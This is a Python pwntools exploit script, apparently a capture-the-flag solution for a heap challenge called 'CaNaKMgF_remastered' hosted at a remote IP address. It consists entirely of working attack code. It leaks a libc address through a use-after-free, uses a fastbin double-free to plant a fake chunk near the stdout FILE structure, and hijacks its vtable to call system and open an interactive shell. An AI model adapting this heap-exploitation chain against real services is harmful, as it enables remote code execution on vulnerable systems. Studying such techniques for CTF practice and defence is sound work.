from pwn import *
from time import sleep

debug=0
if debug:
    p=process('./CaNaKMgF_remastered')
else:
    p=remote('128.199.85.217','10001')
e=ELF('./libc.so')
def alloc(l,buf,just=1):
    p.recvuntil('Run away')
    p.sendline('1')
    p.recvuntil('?')
    p.sendline(str(l))
    sleep(0.5)
    if just:
        p.send(buf.ljust(l,'\x00'))
    else:
        p.sendline(buf)

def play(file):
    p.recvuntil('Run away')
    p.sendline('2')
    p.recvuntil('?')
    p.sendline(str(file))

def free(id):
    p.recvuntil('Run away')
    p.sendline('3')
    p.recvuntil('?')
    p.sendline(str(id))

def read(id):
    p.recvuntil('Run away')
    p.sendline('4')
    p.recvuntil('?')
    p.sendline(str(id))

for x in xrange(2):
    alloc(256,'/bin/sh')
free(0)
read(0)
d=p.recvuntil('\n')[1:-1].ljust(8,'\x00')
libc=u64(d)-0x3c3b78
log.success('libc:'+hex(libc))
fakechunk=libc+0x3c46bd
system=libc+e.symbols['system']
vtable=fakechunk+3-0x28
stdout=libc+e.symbols['_IO_2_1_stdout_']
gets=libc+e.symbols['gets']

log.success('system:'+hex(system))
log.success('fake:'+hex(fakechunk))
log.success('stdout:'+hex(stdout))
for x in xrange(3):
    alloc(100,'buf')
free(2)
free(3)
free(2)

alloc(100,p64(fakechunk))
alloc(100,'buf')
alloc(100,'abc')
#gdb.attach(p, 'b *{}'.format(gets))
alloc(100,'\x00'*3+p64(gets)+p64(0)+p64(0xffffffff)+p64(0)*2+p64(vtable),just=0)
sleep(0.5)
p.sendline('1\x80;/bin/sh;\x00'.ljust(0xd0,'\x00')+p64(system)+p64(stdout+0xd0-0x38))
p.interactive()